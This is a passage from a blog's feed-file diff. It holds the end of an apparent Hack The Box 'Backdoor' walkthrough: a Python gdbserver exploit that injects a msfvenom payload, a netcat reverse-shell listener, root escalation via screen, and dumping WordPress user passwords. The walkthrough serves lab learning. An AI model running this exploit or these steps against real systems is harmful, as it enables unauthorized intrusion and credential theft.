+        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'08'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Found x86 arch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;hex_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Sending payload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'M{addr},{hex_length}:{payload}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'vCont;c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;FileNotFoundError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[!] ERROR: File {file} not found'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Connected to target. Preparing exploit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[*] Pwned!! Check your listener'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura33.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Then with netcat we ara going to listen on the port 4444 and then execute the exploit specifying the victim machine ip and the payload that we generate with msfvenom.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura34.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And as we can see we have a connection and we are as the user &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt;, and we are going to indicate that we want a pseudo console.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura35.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we want another way to report a pseudo console we can do it using python.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura38.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;And with this command I want the remote shell to be the size of my terminal and that it can do ctrl + c and not get out of the session.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura36.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;let’s export two environment variables.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura37.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And i found the first flag.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura39.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ok now i need to access as root for this i am going to test if it works for me with the &lt;em&gt;** screen **&lt;/em&gt; command. and if it lets me login as root.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura40.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we can see tha second flag to submit in the htb.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura41.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And with the credentials of the database that we had saved we can use it to access in the database.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura42.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We can see the databases that are created.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura43.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We can access the wordpress database and here we can enter the &lt;strong&gt;&lt;em&gt;wp-users&lt;/em&gt;&lt;/strong&gt; table to see the users and passwords.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura44.png&quot; /&gt;
 &lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Hack the box" /><category term="wordpress" /><category term="reverse shell" /><category term="lfi" /><summary type="html">Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.</summary></entry><entry><title type="html">Tmux Shortcuts</title><link href="http://localhost:4000/tmux-short/" rel="alternate" type="text/html" title="Tmux Shortcuts" /><published>2021-11-25T00:00:00+01:00</published><updated>2021-11-25T00:00:00+01:00</updated><id>http://localhost:4000/tmux-short</id><content type="html" xml:base="http://localhost:4000/tmux-short/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/tmux/tmux22.png&quot; /&gt;
 &lt;/p&gt;
